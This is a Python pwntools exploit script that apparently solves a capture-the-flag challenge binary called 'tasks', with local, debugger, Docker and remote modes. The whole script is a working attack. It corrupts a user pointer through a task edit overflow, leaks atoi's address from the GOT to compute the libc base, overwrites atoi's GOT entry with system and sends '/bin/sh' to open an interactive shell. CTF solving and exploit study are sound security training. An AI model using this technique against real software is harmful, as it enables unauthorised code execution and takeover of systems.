#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './tasks_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'tasks.web.cpctf.space', 30014

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set resolve-heap-via-heuristic force
    # set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='tasks')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    global io
    io = initialize()
    
    with log.progress("Edit user as dummy address"), context.silent:
        io.sendlineafter(b'>', b'2') #User Menu
        io.sendlineafter(b'>', b'2') #Edit User
        io.sendlineafter(b':', p64(elf.got['__stack_chk_fail'])) #Valid Address
    
    with log.progress("Delete then overflow task to edit user pointer"), context.silent:    
        io.sendlineafter(b'>', b'1') #Task Menu
        io.sendlineafter(b'>', b'3') #Delete Task
        io.sendlineafter(b'>', b'3')
        io.sendlineafter(b'>', b'3')
        io.sendlineafter(b'>', b'2') #Edit Task
        io.sendlineafter(b':', b"A"*8+p64(elf.got["atoi"])) #Leak atoi
        io.sendlineafter(b':', b"/bin/sh\0")

    with log.progress("Leak libc address"), context.silent:
        io.sendlineafter(b'>', b'2') #User Menu
        io.recvuntil("User 1: ")
        atoi = u64(io.recvline().strip().ljust(8, b'\x00'))
        libc.address = atoi - libc.symbols['atoi']
    log.info("atoi: %#x", atoi)
    log.info("Libc base: %#x", libc.address)

    with log.progress("Overwrite got atoi with system"), context.silent:
        io.sendlineafter(b'>', b'2') #Edit User
        io.sendlineafter(b':', p64(libc.sym["system"])) #Overwrite got atoi with system 
        io.sendlineafter(b'>', b'/bin/sh\0')
    io.interactive()

if __name__ == '__main__':
    exploit()
